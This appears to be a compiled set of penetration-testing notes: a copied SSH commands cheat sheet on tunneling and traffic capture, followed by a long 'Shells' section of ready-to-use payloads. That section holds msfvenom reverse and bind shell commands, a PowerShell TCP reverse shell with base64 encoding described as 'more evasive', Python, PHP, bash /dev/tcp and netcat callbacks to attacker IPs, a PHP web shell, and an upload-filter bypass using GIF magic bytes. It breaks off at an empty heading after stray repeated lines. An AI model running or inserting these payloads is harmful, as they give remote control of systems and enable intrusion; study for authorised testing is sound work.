<tr><td><code>ls</code></td><td>List files and directories</td></tr>
<tr><td><code>mkdir</code></td><td>Create a new directory</td></tr>
<tr><td><code>mv</code></td><td>Move files or directories</td></tr>
<tr><td><code>nano</code></td><td>Edit a file in the terminal using Nano</td></tr>
<tr><td><code>ps</code></td><td>List running processes</td></tr>
<tr><td><code>pwd</code></td><td>Display the current working directory</td></tr>
<tr><td><code>tail</code></td><td>View the last few (10, by default) lines of a file</td></tr>
<tr><td><code>top</code></td><td>Monitor system resources and processes</td></tr>
<tr><td><code>touch</code></td><td>Create a new file or update the timestamp of an existing file</td></tr>
<tr><td><code>vim</code></td><td>Edit a file in the terminal using Vim</td></tr>
<tr><td><code>exit</code></td><td>Close the SSH session</td></tr>
</tbody></table>
</div>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/1.-Using-PowerShell-to-access-a-lab-account-on-a-network-computer-via-SSH-on-Windows-10.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/1.-Using-PowerShell-to-access-a-lab-account-on-a-network-computer-via-SSH-on-Windows-10.png" alt="Using PowerShell to access a lab account on a network computer via SSH on Windows 10" title="Using PowerShell to access SSH on Windows 10" /></a></p>
<p><em>Using PowerShell to access a lab account on a network computer via SSH on Windows 10</em></p>
<h2 id="advanced-ssh-commands"><a class="header" href="#advanced-ssh-commands">Advanced SSH Commands</a></h2>
<p>This table lists some complex SSH utilities that can help with network administration tasks: SSH File System (SSHFS), data compression, and X11 forwarding.</p>
<p>To conduct X11 forwarding over SSH, do these three things:</p>
<ol>
<li>Set up your client (<code>~/.ssh/config</code>) to forward X11 by setting these parameters:<br />
<code>Host *</code><br />
<code>ForwardAgent yes   ForwardX11 yes</code></li>
<li>Set up your server (<code>/etc/ssh/sshd_config</code>) to allow X11 by setting these parameters:<br />
<code>X11Forwarding yes   X11DisplayOffset 10   X11UseLocalhost no</code></li>
<li>Set up X11 authentication on your server by installing <code>xauth</code>.</li>
</ol>
<div class="table-wrapper"><table><thead><tr><th><strong>COMMAND</strong></th><th><strong>DESCRIPTION</strong></th></tr></thead><tbody>
<tr><td><code>sshfs</code></td><td>Mount a remote server’s file system on a local directory.  <br>Remember to <a href="https://phoenixnap.com/kb/sshfs">install</a> this program onto your machine before use. Example installation commands:  <br><code>• sudo apt install sshfs # Ubuntu/Debian   • sudo yum install fuse-sshfs # CentOS</code>  <br>Learn to install apps on various Linux distributions <a href="https://www.stationx.net/linux-command-line-cheat-sheet/#installing-new-programs">here</a>.</td></tr>
<tr><td><code>ssh -C hostname</code></td><td>Compress SSH traffic to improve performance on slow connections.  <br>Alternatively, insert <code>Compression yes</code> into your SSH <a href="https://www.stationx.net/ssh-commands-cheat-sheet/#SSHConfigurationsandOptions">configuration files</a>.</td></tr>
<tr><td><code>ssh -o "Compression yes" -v hostname</code></td><td>An alternative method to compress SSH traffic to improve performance on slow connections.  <br>This is the same as inserting <code>Compression yes</code> into your SSH <a href="https://www.stationx.net/ssh-commands-cheat-sheet/#SSHConfigurationsandOptions">configuration files</a>.</td></tr>
<tr><td><code>ssh -X user@server</code></td><td>Enable X11 forwarding over SSH: forward graphical applications from a remote <code>server</code> as a <code>user</code> to a local machine.</td></tr>
<tr><td><code>ssh -o ForwardX11=yes user@server</code></td><td>Enable X11 forwarding over SSH: forward graphical applications from a remote <code>server</code> as a <code>user</code> to a local machine.</td></tr>
<tr><td><code>ssh -x</code></td><td>Disable X11 forwarding</td></tr>
<tr><td><code>ssh -Y</code></td><td>Enable trusted X11 forwarding. This option is riskier than <code>ssh -X</code> as it forwards the entire display of the SSH server to the client.</td></tr>
</tbody></table>
</div>
<p><strong>Download the PDF Version of This SSH Commands Cheat Sheet!</strong></p>
<p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we’ll send a PDF copy to your inbox.</p>
<p><strong>DOWNLOAD →</strong></p>
<h2 id="tunneling"><a class="header" href="#tunneling">Tunneling</a></h2>
<p>These SSH command line options create secure tunnels.</p>
<div class="table-wrapper"><table><thead><tr><th><strong>OPTIONS</strong></th><th><strong>DESCRIPTION</strong></th><th><strong>SYNTAX / EXAMPLE</strong></th></tr></thead><tbody>
<tr><td><code>-L</code></td><td>Local port forwarding: forward a port on the local machine (SSH client) to a port on the remote machine (<code>ssh_server</code> as <code>user</code>), the traffic of which goes to a port on the <code>destination</code> machine.  <br>The parameters <code>local_port</code> and <code>remote_port</code> can match.</td><td><code>ssh user@ssh_server -L local_port:destination:remote_port   # Examplessh root@192.168.0.1 -L 2222:10.0.1.5:3333</code></td></tr>
<tr><td><code>-J</code></td><td>ProxyJump; ensure that traffic passing through the intermediate/bastion hosts is always encrypted end-to-end.  <br>ProxyJump is how you use bastion hosts to connect to a remote host with a single command.</td><td><code>ssh -J proxy_host1 remote_host2   ssh -J user@proxy_host1 user@remote_host2   # Multiple bastion hosts/jumpsssh -J user@proxy_host1:port1,user@proxy_host2:port2 user@remote_host3</code></td></tr>
<tr><td><code>-R</code></td><td>Remote port forwarding: forward a port <code>remote_port</code> on the remote machine (<code>ssh_server</code> as <code>user</code>) to a port on the local machine (SSH client), the traffic of which goes to a port <code>destination_port</code> on the <code>destination</code> machine.  <br>An empty <code>remote</code> means the remote SSH server will bind on all interfaces.  <br>Additional SSH options in the example:  <br><code>-N</code>: don’t execute remote commands; useful for dedicated port forwarding  <br><code>-f</code>: run SSH in the background.</td><td><code>ssh -R [remote:]remote_port:destination:destination_port [user@]ssh_server   # Examplessh -R 8080:192.168.3.8:3030 -N -f user@remote.host</code></td></tr>
<tr><td><code>-D</code></td><td>Set up a SOCKS Proxy to tunnel traffic from a <code>remote_host</code> on which you’re the <code>user</code> to a <code>local_port_number</code>.  <br>Additional SSH options in the example:  <br><code>-q</code>: quiet mode; don’t output anything locally  <br><code>-C</code>: compress data in the tunnel, save bandwidth  <br><code>-N</code>: don’t execute remote commands; useful for dedicated port forwarding  <br><code>-f</code>: run SSH in the background.</td><td><code>ssh -D local_port_number user@remote_host   # Examplessh -D 6677 -q -C -N -f me@192.168.5.5</code></td></tr>
</tbody></table>
</div>
<h3 id="ssh-tunneling-demonstration"><a class="header" href="#ssh-tunneling-demonstration">SSH Tunneling Demonstration</a></h3>
<p>Let’s show you two ways to pipe traffic from your router into Wireshark and monitor your network activity. The first demonstration involves installing programs onto a system used as a router; the second, without.</p>
<h4 id="using-django"><a class="header" href="#using-django">Using Django</a></h4>
<p><img src="https://www.stationx.net/wp-content/uploads/2023/05/2.-SSH-Tunneling-Demo.png.png" alt="SSH Tunneling Demo" title="SSH Tunneling Demo - Django" /></p>
<p>As a demonstration, we’re piping traffic from a router into <a href="https://www.stationx.net/wireshark-cheat-sheet/">Wireshark</a>, so that we can monitor live web traffic through an SSH tunnel. (The router below is a macOS computer hosting a Kali Linux virtual machine using the Wireshark instance installed on the latter.)</p>
<p>The setup is as follows:</p>
<ol>
<li><strong>On the router:</strong> Enable remote access via SSH. (NOTE: On the macOS system, go to <strong>System Preferences</strong> &gt; <strong>Sharing</strong> &gt; turn on <strong>Remote Login</strong> and note the login username and hostname. For your router setup, check your specific manufacturer's guide to enable remote access via SSH.)</li>
<li><strong>On the router:</strong> <a href="https://docs.djangoproject.com/en/4.2/intro/tutorial01/">Install Python Django</a> and start up the Django template server on <a href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a> using the Terminal command string <code>django-admin startproject mysite; cd mysite; python manage.py runserver</code> (or <code>python3 manage.py runserver</code>). Note the Django web app uses port 8000.</li>
<li><strong>On Kali Linux:</strong> execute this command to listen on port 8080: <code>ls | nc -l -p 8080</code></li>
<li><strong>On Kali Linux:</strong> execute this command in a different Terminal tab/window. Below, <code>8000</code> is the router’s Django port, <code>8080</code> is the Kali Linux listening port on <code>localhost</code>, and the command involves remote port forwarding (<code>-R</code>): <code>sudo ssh -R 8000:localhost:8080 user@router_ip</code></li>
<li><strong>On Kali Linux:</strong> start Wireshark and select the loopback interface (<code>lo</code>) as the capture device. Wireshark should be sniffing packets on <code>lo</code> now.</li>
<li><strong>On the router:</strong> visit <a href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a> in a web browser. (Note <code>localhost</code> and 127.0.0.1 are equivalent.) The Django server wouldn’t load; it freezes instead because of the rerouted traffic.</li>
<li><strong>On Kali Linux:</strong> You should expect the following results:</li>
</ol>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/3.-Piping-traffic-of-Django-web-app-http127.0.0.18000-on-the-macOS-router-into-the-Wireshark-instance-on-Kali-Linux.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/3.-Piping-traffic-of-Django-web-app-http127.0.0.18000-on-the-macOS-router-into-the-Wireshark-instance-on-Kali-Linux.png" alt="Piping traffic of Django web app http127.0.0.18000 on the macOS router into the Wireshark instance on Kali Linux" title="SSH piping router traffic into Wireshark" /></a></p>
<p><em>Piping traffic of Django web app <a href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a> on the macOS router into the Wireshark instance on Kali Linux</em></p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/4.-Wireshark-HTTP-packet-corresponding-to-the-Django-web-app-on-the-router.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/4.-Wireshark-HTTP-packet-corresponding-to-the-Django-web-app-on-the-router.png" alt="Wireshark HTTP packet corresponding to the Django web app on the router" title="SSH Wireshark HTTP packet" /></a></p>
<p><em>Wireshark HTTP packet corresponding to the Django web app on the router</em></p>
<p><strong>Download the PDF Version of This SSH Commands Cheat Sheet!</strong></p>
<p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we’ll send a PDF copy to your inbox.</p>
<p><strong>DOWNLOAD →</strong></p>
<h4 id="using-tcpdump"><a class="header" href="#using-tcpdump">Using tcpdump</a></h4>
<p><img src="https://www.stationx.net/wp-content/uploads/2023/05/5.-SSH-Tunneling-Demo.png" alt="SSH Tunneling Demo" title="SSH Tunneling Demo - tcpdump" /></p>
<p>The following is an alternative method for capturing remote web traffic passing through a router.</p>
<p>In Kali Linux, you’ll log in to your router via SSH, capture packets with the command-line packet capturing tool <a href="https://www.stationx.net/tcpdump-cheat-sheet/">tcpdump</a>, and pipe the traffic into Wireshark.</p>
<p>Here is the required command with the option flags explained:</p>
<p><code>ssh [username]@[hostname/ip] tcpdump -U -s 65525 -w - 'not port 22' | wireshark -k -i -</code></p>
<ul>
<li><code>-U</code>: No buffering. Produce real-time output.</li>
<li><code>-s 65525</code>: Grab 65525 bytes of data from each packet rather than the default of 262144 bytes. 65525 is the <a href="https://wiki.wireshark.org/MTU.md">maximum transmission unit of a Point-to-Point Protocol packet</a> that Wireshark can handle. Adjust this number as you see fit.</li>
<li><code>-w</code>: Write each packet to the output packet capture file on your local disk in Kali Linux. Combining <code>-U</code> and <code>-w</code> means tcpdump writes to your output file as the packets pour in, rather than until the memory buffer fills up.</li>
<li><code>'not port 22'</code>: This is to prevent tcpdump from echoing the SSH packets sent between your machine and the router.</li>
<li><a href="https://explainshell.com/explain?cmd=wireshark+-k+-i+-"><code>-k -i -</code></a>: Start the capture immediately and use the command before the pipe character (<code>|</code>) as the capture interface.</li>
</ul>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/6.-Example-of-piping-router-traffic-to-Wireshark-via-tcpdump.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/6.-Example-of-piping-router-traffic-to-Wireshark-via-tcpdump.png" alt="Example of piping router traffic to Wireshark via tcpdump" title="Example of piping router traffic to Wireshark via tcpdump: ssh root@192.168.1.1 tcpdump -U -s 65525 -w - &#39;not port 22&#39; | wireshark -k -i -" /></a></p>
<p><em>Example of piping router traffic to Wireshark via tcpdump</em></p>
<p>After executing the command above, Wireshark opens:</p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/7.-After-executing-the-command-above.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/7.-After-executing-the-command-above.png" alt="After executing the command above" title="After executing the command above, Wireshark opens" /></a></p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/8.-Wireshark-triggered.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/8.-Wireshark-triggered.png" alt="Wireshark triggered" title="Wireshark triggered" /></a></p>
<p><em>Wireshark triggered</em></p>
<p>Next, the SSH client will prompt you to input your router password. Pasting it suffices:</p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/9.-SSH-client-will-prompt-you.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/9.-SSH-client-will-prompt-you.png" alt="SSH client will prompt you" title="Pasting router SSH password" /></a></p>
<p>SSH login successful. Now, tcpdump packet capture begins:</p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/10.-tcpdump-packet-capture-begins.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/10.-tcpdump-packet-capture-begins.png" alt="tcpdump packet capture begins" title="SSH login success. Now, tcpdump packet capture begins." /></a></p>
<p>Meanwhile, Wireshark receives the piped traffic from tcpdump:</p>
<p><a href="https://www.stationx.net/wp-content/uploads/2023/05/11.-Wireshark-receives-the-piped-traffic-from-tcpdump.png"><img src="https://www.stationx.net/wp-content/uploads/2023/05/11.-Wireshark-receives-the-piped-traffic-from-tcpdump.png" alt="Wireshark receives the piped traffic from tcpdump" title="Meanwhile Wireshark receives the piped traffic from tcpdump" /></a></p>
<p>That’s it.</p>
<h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
<p>We have covered SSH, SCP, SFTP, SSH configuration commands such as <code>ssh-agent</code>, <code>ssh-add</code>, and <code>ssh-copy-id</code>, and various SSH tunneling commands.</p>
<p>Here are some tips for using SSH more efficiently and securely:</p>
<ul>
<li>Disable X11 and TCP forwarding because attackers can use such weaknesses to access other systems on your network. Change the options on <code>sshd_config</code> to be <code>AllowTcpForwarding no</code> and <code>X11Forwarding no</code>.</li>
<li>Change the default options on <code>sshd_config</code>, such as <a href="https://www.techrepublic.com/article/tips-securing-ssh-linux-servers/">changing the default port</a> from 22 to another number.</li>
<li>Authenticate clients using SSH certificates created with <code>ssh-keygen</code>.</li>
<li>Use a bastion host with the help of <a href="https://www.stationx.net/ssh-commands-cheat-sheet/#Tunneling">tunneling</a> commands.</li>
<li>Restrict SSH logins to specific IPs, such as adding user filtering with the <code>AllowUsers</code> option in <code>sshd_config</code>.</li>
</ul>
<p>Thanks to its security measures and the ubiquity of networking tasks, SSH is indispensable for computer data communications. Hence every student and professional in IT and cyber security needs a working knowledge of SSH commands, and we hope this SSH cheat sheet is a good starter or refresher for you.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="shells"><a class="header" href="#shells">Shells</a></h2>
<h3 id="go-to"><a class="header" href="#go-to"><ins>Go To</ins></a></h3>
<ul>
<li><a href="https://www.revshells.com/">Reverse Shell Generator</a></li>
<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PenTestMonkey</a></li>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/">Payloads All The Things</a></li>
</ul>
<h3 id="quick-note"><a class="header" href="#quick-note"><ins>Quick Note</ins></a></h3>
<pre><code>Shell cleanup
------

Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.

Type sh
Then do this:

ctrl+z
# for zsh
echo $TERM
stty -a 
stty raw -echo; fg; reset
stty columns 200 rows 200
export PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/games:/tmp
export TERM=xterm-256color
python3 -c 'import pty; pty.spawn("/bin/sh")'

Also do this:

alias ll='clear ; ls -lsaht --color=auto'

echo $TERM &amp;&amp; tput lines &amp;&amp; tput cols


# for bash
stty raw -echo
fg
reset
export SHELL=bash



Other Notes:

If you have the ability to upload to a site a php reverse shell, but it doesn't like .php extension, another options is to do this first:

echo "AddType application/x-httpd-php .dork" &gt; .htaccess

</code></pre>
<h3 id="web-shells"><a class="header" href="#web-shells"><ins>WEB SHELLS</ins></a></h3>
<p><strong>/usr/share/webshells</strong></p>
<p><strong>MSFvenom Format:-</strong></p>
<p><code>msfvenom -p &lt;PAYLOAD&gt; -e &lt;ENCODER&gt; -f &lt;FORMAT&gt; -i &lt;ENCODE COUNT&gt; LHOST=&lt;IP&gt;</code></p>
<p>One can also use the <code>-a</code> to specify the architecture or the <code>--platform</code></p>
<h3 id="windows"><a class="header" href="#windows"><ins>WINDOWS</ins></a></h3>
<h4 id="reverse-shell"><a class="header" href="#reverse-shell"><strong>Reverse Shell</strong></a></h4>
<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe

msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe

msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe


#Bad chars ID'd
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.49.130 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LPORT=4444 -e x86/alpha_mixed -f c
</code></pre>
<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind Shell</a></h4>
<pre><code>msfvenom -p windows/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; bind.exe
</code></pre>
<h4 id="create-user"><a class="header" href="#create-user">Create User</a></h4>
<pre><code>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe &gt; adduser.exe
</code></pre>
<h4 id="cmd-shell"><a class="header" href="#cmd-shell">CMD Shell</a></h4>
<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; prompt.exe
</code></pre>
<h4 id="execute-command"><a class="header" href="#execute-command"><strong>Execute Command</strong></a></h4>
<pre><code>msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe &gt; pay.exe

msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe &gt; pay.exe
</code></pre>
<h4 id="encoder"><a class="header" href="#encoder">Encoder</a></h4>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe
</code></pre>
<h4 id="embedded-inside-executable"><a class="header" href="#embedded-inside-executable">Embedded inside executable</a></h4>
<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
</code></pre>
<h4 id="powershell-1"><a class="header" href="#powershell-1">Powershell</a></h4>
<pre><code>$client = New-Object System.Net.Sockets.TCPClient('192.168.45.225',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Apparently this is a more evasive way of doing it:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();"




PowerShell one-line example w/ encoding:

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

or 

$MyCommand = '$callback = New-Object System.Net.Sockets.TCPClient("192.168.45.225",8080);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()'

$MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$MyCommand"))

$MyBase64


</code></pre>
<h4 id="python-to-encode-powershell-reverse-shell"><a class="header" href="#python-to-encode-powershell-reverse-shell">Python to encode Powershell Reverse Shell</a></h4>
<pre><code>Quick Python Powershell Reverse Shell generator
---

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

</code></pre>
<h3 id="linux"><a class="header" href="#linux"><ins>LINUX</ins></a></h3>
<h4 id="reverse-shell-1"><a class="header" href="#reverse-shell-1"><strong>Reverse Shell</strong></a></h4>
<pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf

msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf

msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
</code></pre>
<h4 id="bind-shell-1"><a class="header" href="#bind-shell-1">Bind Shell</a></h4>
<pre><code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; bind.elf
</code></pre>
<h4 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h4>
<pre><code>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -e x86/shikata_ga_nai -b '\x00' &gt; solshell.elf
</code></pre>
<h4 id="another-python-method"><a class="header" href="#another-python-method">Another Python Method</a></h4>
<pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lhost 192.168.45.222; set lport 4444; exploit"
</code></pre>
<h3 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h3>
<h3 id="php-checker"><a class="header" href="#php-checker">PHP Checker</a></h3>
<p>https://github.com/teambi0s/dfunc-bypasser</p>
<pre><code>&lt;?php phpinfo(); ?&gt;

python dfunc-bypasser.py --file /home/kali/Downloads/miinfo.html
</code></pre>
<h4 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h4>
<p>https://github.com/ivan-sincek/php-reverse-shell</p>
<p>Here: /opt/php-reverse-shell</p>
<h5 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h5>
<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php

cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php

</code></pre>
<pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre>
<pre><code>&lt;?php

system('nc.exe -e cmd.exe 10.10.10.5 4444')

?&gt;

or


&lt;?php
exec("/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.45.204/4444 0&gt;&amp;1'");


</code></pre>
<pre><code>&lt;?php system($_REQUEST["cmd"]); ?&gt;
</code></pre>
<pre><code class="language-php">
You could also encode this:

    echo "sh -i &gt;&amp; /dev/tcp/192.168.1.75/8081 0&gt;&amp;1" | base64 -w 0


Then do this with GIF Magic Bytes

     GIF89a;
    &lt;?php
      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
    ?&gt;
</code></pre>
<h4 id="aspx"><a class="header" href="#aspx">ASP/x</a></h4>
<h5 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h5>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp &gt;reverse.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx &gt;reverse.aspx
</code></pre>
<h4 id="jsp"><a class="header" href="#jsp">JSP</a></h4>
<h5 id="reverse-shell-4"><a class="header" href="#reverse-shell-4">Reverse shell</a></h5>
<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw&gt; reverse.jsp
</code></pre>
<h4 id="war"><a class="header" href="#war">WAR</a></h4>
<h5 id="reverse-shell-5"><a class="header" href="#reverse-shell-5">Reverse Shell</a></h5>
<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war
</code></pre>
<h4 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h4>
<pre><code>msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
</code></pre>
<h3 id="script-language-payloads"><a class="header" href="#script-language-payloads"><strong>Script Language payloads</strong></a></h3>
<h4 id="perl"><a class="header" href="#perl"><strong>Perl</strong></a></h4>
<pre><code>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.pl
</code></pre>
<h4 id="python"><a class="header" href="#python"><strong>Python</strong></a></h4>
<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.py
</code></pre>
<h4 id="php-1"><a class="header" href="#php-1">PHP</a></h4>
<pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre>
<pre><code>&lt;?php

system('nc.exe -e cmd.exe 10.10.14.13 4444')

?&gt;

&lt;?php system($_REQUEST["cmd"]); ?&gt;
</code></pre>
<h3 id="php-proc_open"><a class="header" href="#php-proc_open">PHP Proc_Open</a></h3>
<p>https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7
https://0xdf.gitlab.io/2023/01/21/htb-updown.html</p>
<p>This was from UpDown HTB</p>
<pre><code>&lt;?php
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("bash", $descriptorspec, $pipes);
if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 =&gt; writeable handle connected to child stdin
    // 1 =&gt; readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt
fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.76 2222 &gt;/tmp/f");
    fclose($pipes[0]);
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?&gt;
google.com
google.com
google.com
google.com
google.com
google.com
</code></pre>
<h4 id="bash"><a class="header" href="#bash">BASH</a></h4>
